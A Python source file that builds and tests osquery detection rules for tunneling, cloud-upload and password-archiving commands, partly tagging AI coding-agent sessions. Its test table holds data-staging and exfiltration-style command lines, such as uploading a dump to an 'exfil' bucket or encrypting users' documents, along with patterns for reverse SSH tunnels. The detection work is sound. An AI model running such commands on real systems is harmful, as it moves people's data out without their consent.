# The source of the R37/R38 parts of agents/config/osquery.conf: edit here, run this file (it tests every pattern
# in a real osquery, osqueryd -S), then regenerate the conf. tests/test_hostrules.py checks the conf still carries
# exactly the fragments built here.
"""R37/R38 command-line patterns, tested in the real osquery (regex_match) before they go into osquery.conf.

Patterns run on lower(cmdline). Each flag is a cheap LIKE gate first (most execs are git, node, bash: a few LIKEs
instead of twenty regexes; measured 17.3 s -> 0.6 s on 5,000 rows) and then one regex_match per pattern, OR'ed:
osquery caps a regex at 256 bytes. The destination is a COALESCE of capture groups, so the command line itself never
needs to be kept, and no credential, user name or local path can reach it.
"""
import json
import subprocess
import sys

E = r'(?:\.exe|\.cmd)?"?'   # an optional Windows extension and the closing quote of a quoted path
P = r'(?:^|[\\/"])'         # the program at the start of its own command line or after a path: not a word in an argument
# rclone's last positional argument is the destination: "remote:path" there means files are going out to it (a
# download, `rclone copy gdrive:x /local`, has the remote first and is not staging).
RCLONE_OUT = (r"\s+[^|]*?\s\"?([a-z0-9_-]{2,}):[^\s\"]*\"?(?:\s+--(?:config|log-file|[a-z]+-from|password-command)"
              r"[\s=]\S+|\s+-\S+(?:\s+[^\s/\\:-][^\s:]*)?)*\s*$")
TUNNEL = [
    P + r"ngrok" + E + r"\s+(?:http|tcp|tls|start|tunnel)\b",
    P + r"cloudflared" + E + r"\s+(?:[^|]*\s)?tunnel\b",
    P + r"code(?:-insiders)?" + E + r"\s+tunnel\b",
    P + r"code-tunnel" + E + r"(?:\s|$)",
    P + r"devtunnel" + E + r"\s+host\b",
    P + r"tailscale" + E + r"\s+funnel\b",
    P + r"ssh" + E + r"\s+(?:[^|]*\s)?-[a-z]*r\s*[0-9]",
    P + r"lt(?:\.js)?" + E + r"\s+(?:--port|-p)\b",   # npm's lt; on Windows the work runs as node.exe ...\lt.js
    P + r"bore" + E + r"\s+local\b",
]
SYNC = [
    P + r"rclone" + E + r"\s+(?:copy|copyto|sync|move|moveto|bisync)" + RCLONE_OUT,
    P + r"restic" + E + r"\s+(?:[^|]*\s)?backup\b",
    P + r"aws" + E + r"\s+s3\s+(?:cp|sync|mv)\s+(?:-\S+\s+)*(?!\"?s3://)\"?[^\s\"-][^\s\"]*\"?\s+(?:-\S+\s+)*\"?s3://",
    P + r"(?:gsutil|gcloud(?:\s+storage)?)" + E + r"\s+(?:-\S+\s+)*(?:cp|rsync|mv)\s+(?:-\S+\s+)*(?!\"?gs://)\"?[^\s\"-][^\s\"]*\"?\s+(?:-\S+\s+)*\"?gs://",
    P + r"azcopy" + E + r"\s+(?:copy|cp|sync)\s[^|]*\.blob\.core\.windows\.net",
    P + r"az" + E + r"\s+storage\s+blob\s+(?:upload|upload-batch|sync)\b",
    P + r"(?:mega-put|mega-sync|megaput)\b|" + P + r"megatools\s+(?:put|copy)\b",
    P + r"winscp(?:\.com|\.exe)?\"?\s[^|]*\bput\b",
]
# Exactly one capture group each, so regex_match(x, D, 1) is the destination and nothing else. A repository or
# server is named only by its host: credentials are skipped up to the *last* @ before the host (a password may hold
# an @), and a local repository (a drive letter or a path) is never captured: it would carry the user name.
DEST = [
    P + r"rclone" + E + r"\s+(?:copy|copyto|sync|move|moveto|bisync)" + RCLONE_OUT,
    P + r"restic" + E + r"\s+(?:[^|]*\s)?(?:-r|--repo)[\s=]+\"?(?:s3|b2|azure|gs|sftp|rest|rclone|swift):/*"
        r"(?:https?://)?(?:[^\s\"]*@)?(?!https?:)([^\s/\\:\"@]+)(?=/|:[0-9/]|\s|\"|$)",
    r"\bs3://([a-z0-9._-]+)",
    r"\bgs://([a-z0-9._-]+)",
    r"https://([a-z0-9]+)\.blob\.core\.windows\.net",
    r"--account-name[\s=]+\"?([a-z0-9]+)",
    P + r"(mega)-(?:put|sync)\b",
    r"\bopen\s+\"?[a-z]+://(?:[^\s\"]*@)?([^/\s:\"@]+)(?=/|:[0-9/]|\s|\"|$)",
]
ARCHIVE_PW = [
    P + r"7z[a-z]?" + E + r"\s+a\s+(?:[^|]*\s)?-p",
    P + r"(?:win)?rar" + E + r"\s+a\s+(?:[^|]*\s)?-(?:hp|p)",
    P + r"zip\s+(?:[^|]*\s)?(?:-e\b|-p\s|--encrypt|--password)",
]
ARCHIVE_OF = r"[\\/](documents|desktop|pictures|onedrive)\b"
# The LIKE gates: words every matching line must contain. Distinctive ones only (not "lt", "s3" or "-r" alone).
GATE_TUNNEL = ("%ngrok%", "%cloudflared%", "%tunnel%", "%funnel%", "%ssh%", "lt %", "%/lt %", "%\\lt %", "%/lt\"%",
               "%\\lt\"%", "%lt.cmd%", "%lt.js%", "%bore%")
GATE_SYNC = ("%rclone%", "%restic%", "%aws%", "%gsutil%", "%gcloud%", "%azcopy%", "%storage blob%", "%mega%",
             "%winscp%")
GATE_ARCHIVE = ("%7z%", "%rar%", "%zip%")

CASES = [  # (command line, tunnel?, sync?, archive?, expected dest or None)
    ("ngrok http 3000", 1, 0, 0, None),
    ('"c:\\tools\\ngrok.exe" tcp 22 --authtoken 2abcSECRET', 1, 0, 0, None),
    ("cloudflared tunnel --url http://localhost:8080", 1, 0, 0, None),
    ("cloudflared --no-autoupdate tunnel run --token eyJSECRET", 1, 0, 0, None),
    ("code tunnel --accept-server-license-terms", 1, 0, 0, None),
    ("devtunnel host -p 3000", 1, 0, 0, None),
    ("tailscale funnel 443 on", 1, 0, 0, None),
    ("ssh -nnt -R 80:localhost:3000 localhost.run", 1, 0, 0, None),
    ("ssh -o batchmode=yes -R 9:localhost:9 test@192.0.2.1", 1, 0, 0, None),
    ("/usr/bin/ssh -NR 2222:localhost:22 test@192.0.2.1", 1, 0, 0, None),
    ("lt --port 8000", 1, 0, 0, None),
    ("bore local 8000 --to bore.pub", 1, 0, 0, None),
    ("rclone copy /home/u/documents drive2:backup", 0, 1, 0, "drive2"),
    ("rclone copy /home/u/documents drive2:backup -P --transfers 8", 0, 1, 0, "drive2"),
    ("rclone copy /home/u/docs gdrive:x --config /home/u/.rclone.conf", 0, 1, 0, "gdrive"),
    ("rclone copy c:\\data gdrive:x --log-file c:\\logs\\r.txt", 0, 1, 0, "gdrive"),
    ("restic -r rest:https://someone:pa/ss@example.net/repo backup /x", 0, 1, 0, "example.net"),
    ('restic -r "rest:https://someone:pa ss@example.net/repo" backup /x', 0, 1, 0, None),
    ("restic -r rest:https://example.net:8000/repo backup /x", 0, 1, 0, "example.net"),
    ('winscp.com /command "open sftp://someone:p/w@example.org/" "put x"', 0, 1, 0, "example.org"),
    ("c:\\users\\<user>\\appdata\\roaming\\npm\\lt.cmd --port 80", 1, 0, 0, None),
    ('"c:\\program files\\nodejs\\node.exe" c:\\users\\<user>\\appdata\\roaming\\npm\\node_modules\\localtunnel\\bin\\lt.js --port 80', 1, 0, 0, None),
    ('"/usr/bin/ssh" -R 9:localhost:9 test@192.0.2.1', 1, 0, 0, None),
    ('"c:\\windows\\system32\\openssh\\ssh.exe" -R 9:localhost:9 test@192.0.2.1', 1, 0, 0, None),
    ('"c:\\program files\\rclone\\rclone.exe" sync "c:\\users\\<user>\\desktop" gdrive:/desk', 0, 1, 0, "gdrive"),
    ("restic -r rest:https://u:hunter2@example.net/repo backup /home", 0, 1, 0, "example.net"),
    ("restic -r rest:https://u:p@ss@example.net/repo backup /home", 0, 1, 0, "example.net"),
    ("restic -r s3:s3.amazonaws.com/bucket-x backup /srv", 0, 1, 0, "s3.amazonaws.com"),
    ("restic -r sftp:u@example.org:/srv/repo backup /home", 0, 1, 0, "example.org"),
    ("restic -r c:\\users\\<user>\\repo backup c:\\data", 0, 1, 0, None),
    ('restic.exe -r "d:\\backups" backup c:\\data', 0, 1, 0, None),
    ("restic -r /home/u/repo backup /srv", 0, 1, 0, None),
    ("restic backup /home --tag nightly", 0, 1, 0, None),
    ("aws s3 cp ./dump.tar s3://exfil-bucket-1/x", 0, 1, 0, "exfil-bucket-1"),
    ("gsutil -m cp -r . gs://some-bucket", 0, 1, 0, "some-bucket"),
    ("gcloud storage cp a.zip gs://b2", 0, 1, 0, "b2"),
    ("azcopy copy c:\\data https://acct1.blob.core.windows.net/c?sv=SECRET", 0, 1, 0, "acct1"),
    ("az storage blob upload --account-name acct2 -f x -c c", 0, 1, 0, "acct2"),
    ("mega-put file.zip /", 0, 1, 0, "mega"),
    ('winscp.com /command "open sftp://u:pw@example.org/" "put c:\\x\\*" "exit"', 0, 1, 0, "example.org"),
    ('winscp.com /command "open sftp://u:p@w@example.org/" "put c:\\x\\*" "exit"', 0, 1, 0, "example.org"),
    ("7z a -pS3cret out.7z c:\\users\\<user>\\documents\\*", 0, 0, 1, None),
    ('"c:\\program files\\winrar\\rar.exe" a -hpS3cret x.rar c:\\users\\<user>\\desktop', 0, 0, 1, None),
    ("zip -e -r out.zip /home/u/pictures", 0, 0, 1, None),
    # harmless neighbours: none may fire
    ("rclone copy -v gdrive:photos /home/u/pictures", 0, 0, 0, None),
    ("aws s3 cp s3://bucket/x ./local", 0, 0, 0, None),
    ("gsutil cp gs://bucket/x .", 0, 0, 0, None),
    ("rclone copy gdrive:photos -v /home/u/pictures", 0, 0, 0, None),
    ("rclone copy gdrive:photos --transfers 4 c:\\data", 0, 0, 0, None),
    ("ssh user@host", 0, 0, 0, None),
    ("ssh -l root -p 2222 host", 0, 0, 0, None),
    ("scp -r dir host:/tmp", 0, 0, 0, None),
    ("rclone ls gdrive:", 0, 0, 0, None),
    ("rclone config", 0, 0, 0, None),
    ("restic snapshots", 0, 0, 0, None),
    ("aws s3 ls s3://bucket", 0, 0, 0, None),
    ("code --install-extension ms-python.python", 0, 0, 0, None),
    ("tailscale status", 0, 0, 0, None),
    ("cloudflared --version", 0, 0, 0, None),
    ("7z a out.7z folder", 0, 0, 0, None),
    ("7z x -pS3cret in.7z", 0, 0, 0, None),
    ("zip -r out.zip dir", 0, 0, 0, None),
    ("git commit -m 'ngrok http notes'", 0, 0, 0, None),
]


def sql_str(p: str) -> str:
    return "'" + p.replace("'", "''") + "'"


def gate_sql(x: str, words: tuple[str, ...]) -> str:
    return "(" + " OR ".join(f"{x} LIKE {sql_str(w)}" for w in words) + ")"


def any_sql(x: str, pats: list[str]) -> str:
    """One regex_match per pattern, OR'ed: osquery caps a regex at 256 bytes."""
    return "(" + " OR ".join(f"(regex_match({x}, {sql_str(p)}, 0) IS NOT NULL)" for p in pats) + ")"


def flag_sql(x: str, gate: tuple[str, ...], pats: list[str]) -> str:
    """The LIKE gate first, so a line without any of the words never reaches the regexes."""
    return f"(CASE WHEN {gate_sql(x, gate)} THEN {any_sql(x, pats)} ELSE 0 END)"


def dest_sql(x: str) -> str:
    return "COALESCE(" + ", ".join(f"regex_match({x}, {sql_str(p)}, 1)" for p in DEST) + ")"


def env_sql(key: str) -> str:
    return (f"COALESCE((SELECT value FROM process_envs e WHERE e.pid = x.pid AND e.key = '{key}'), "
            f"(SELECT value FROM process_envs e WHERE e.pid = x.parent AND e.key = '{key}'))")


def linux_inner() -> str:
    """Added to the inner SELECT of bpf_process_events, before ` FROM bpf_process_events WHERE`."""
    x = "lower(cmdline)"
    return (f", {flag_sql(x, GATE_TUNNEL, TUNNEL)} AS lcmd_tunnel, {flag_sql(x, GATE_SYNC, SYNC)} AS lcmd_sync, "
            f"{flag_sql(x, GATE_ARCHIVE, ARCHIVE_PW)} AS lcmd_archive_pw")


def linux_outer() -> str:
    """Added to the outer SELECT, before ` FROM (`: what's kept is the destination and the markers, never the line."""
    x = "lower(cmdline)"
    return (", lcmd_tunnel, lcmd_sync, lcmd_archive_pw"
            f", CASE WHEN lcmd_sync THEN {dest_sql(x)} END AS sync_dest"
            f", CASE WHEN lcmd_archive_pw THEN regex_match({x}, {sql_str(ARCHIVE_OF)}, 1) END AS archive_of"
            f", CASE WHEN lcmd_tunnel OR lcmd_sync THEN {env_sql('CLAUDE_CODE_SESSION_ID')} END AS claude_session"
            f", CASE WHEN lcmd_tunnel OR lcmd_sync THEN {env_sql('CLAUDE_CODE_SESSION_ATTENDED')} END AS claude_attended"
            # Two single-pid lookups, never `pid IN (a, b)`: osquery can't use an IN list to read one process, so
            # it reads every process's environment (all of /proc), about 70x slower, and a process vanishing
            # mid-walk is the "Bad file descriptor: /proc" error that crashed the worker (2026-10-20).
            ", CASE WHEN lcmd_tunnel OR lcmd_sync THEN "
            "(SELECT count(*) FROM process_envs e WHERE e.pid = x.pid AND e.key IN ('SSH_CONNECTION', 'SSH_CLIENT')) + "
            "(SELECT count(*) FROM process_envs e WHERE e.pid = x.parent AND e.key IN ('SSH_CONNECTION', 'SSH_CLIENT')) "
            "END AS via_ssh")


CL = "lower(json_extract(data, '$.EventData.CommandLine'))"


def windows() -> str:
    """Added to sysmon_events after ` AS original_name, `: process starts only (eventid 1)."""
    one = "eventid = 1 AND "
    return (f"CASE WHEN {one}{flag_sql(CL, GATE_TUNNEL, TUNNEL)} THEN 1 ELSE 0 END AS cmd_tunnel, "
            f"CASE WHEN {one}{flag_sql(CL, GATE_SYNC, SYNC)} THEN 1 ELSE 0 END AS cmd_sync, "
            f"CASE WHEN {one}{flag_sql(CL, GATE_ARCHIVE, ARCHIVE_PW)} THEN 1 ELSE 0 END AS cmd_archive_pw, "
            f"CASE WHEN {one}{flag_sql(CL, GATE_SYNC, SYNC)} THEN {dest_sql(CL)} END AS sync_dest, "
            f"CASE WHEN {one}{flag_sql(CL, GATE_ARCHIVE, ARCHIVE_PW)} THEN regex_match({CL}, {sql_str(ARCHIVE_OF)}, 1) "
            "END AS archive_of, ")


def check() -> int:
    rows = []
    for i, (cl, *_rest) in enumerate(CASES):
        x = sql_str(cl.lower())
        rows.append(f"SELECT {i} AS i, {flag_sql(x, GATE_TUNNEL, TUNNEL)} AS t, {flag_sql(x, GATE_SYNC, SYNC)} AS s, "
                    f"{flag_sql(x, GATE_ARCHIVE, ARCHIVE_PW)} AS a, {dest_sql(x)} AS d")
    out = subprocess.run(["/opt/osquery/bin/osqueryd", "-S", "--json"], input=" UNION ALL ".join(rows) + ";\n",
                         capture_output=True, text=True, check=False)
    if out.returncode:
        print(out.stderr)
        return 2
    got = {int(r["i"]): r for r in json.loads(out.stdout)}
    bad = 0
    for i, (cl, t, s, a, d) in enumerate(CASES):
        r = got[i]
        res = (int(r["t"]), int(r["s"]), int(r["a"]), r["d"] or None)
        want = (t, s, a, d)
        if not s:   # the destination only matters when the line is a sync
            res, want = res[:3], want[:3]
        if res != want:
            bad += 1
            print("MISMATCH", cl, "got", res, "want", want)
        for leak in ("secret", "hunter2", "s3cret", "pw@", "sv=", "<user>", "users", "\\", "@", "someone", "pa", "ss"):
            if s and r["d"] and leak in r["d"]:
                bad += 1
                print("LEAK IN DEST", cl, r["d"])
    print(f"{len(CASES) - bad}/{len(CASES)} ok")
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(check())
